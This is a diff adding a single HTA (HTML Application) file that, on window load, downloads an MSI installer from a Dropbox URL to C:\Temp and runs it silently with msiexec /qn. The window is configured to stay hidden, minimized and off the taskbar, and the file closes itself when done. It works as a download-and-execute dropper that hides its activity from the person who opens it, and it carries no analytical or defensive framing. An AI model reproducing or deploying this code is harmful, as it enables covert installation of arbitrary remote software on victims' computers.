@@ -1,0 +1,61 @@
+<hta:application id="htaApp" 
+  applicationname="Download and Execute MSI" 
+  border="none" 
+  caption="no" 
+  contextmenu="no" 
+  innerborder="no" 
+  maximizebutton="no" 
+  minimizebutton="no" 
+  navigable="no" 
+  scroll="no" 
+  selection="no" 
+  showintaskbar="no" 
+  singleinstance="yes" 
+  sysmenu="no" 
+  windowstate="minimize" 
+  windowstyle="hidden" 
+  version="1.0"
+>
+<html>
+  <head>
+    <title>Download and Execute MSI</title>
+    <hta:script language="VBScript">
+      Sub Window_OnLoad
+        Dim objShell
+        Set objShell = CreateObject("WScript.Shell")
+        Dim downloadURL
+        downloadURL = "https://www.dropbox.com/s/bbht0ed15zcbjgk/setup.msi?dl=1"
+        Dim downloadPath
+        downloadPath = "C:\Temp\setup.msi"
+        
+        ' Download the MSI file
+        Dim objHTTP
+        Set objHTTP = CreateObject("MSXML2.XMLHTTP")
+        objHTTP.open "GET", downloadURL, False
+        objHTTP.send
+        
+        If objHTTP.Status = 200 Then
+          Dim objStream
+          Set objStream = CreateObject("ADODB.Stream")
+          objStream.Open
+          objStream.Type = 1 ' Binary
+          objStream.Write objHTTP.ResponseBody
+          objStream.Position = 0
+          objStream.SaveToFile downloadPath, 2 ' Overwrite existing
+          objStream.Close
+          Set objStream = Nothing
+        End If
+        
+        ' Execute the MSI file with administrative privileges
+        objShell.Run "msiexec /i """ & downloadPath & """ /qn", 1, True
+        
+        ' Close the HTA window
+        window.close()
+      End Sub
+    </hta:script>
+  </head>
+  <body style="display:none">
+    <!-- Empty body content -->
+  </body>
+</html>
+</hta:application>
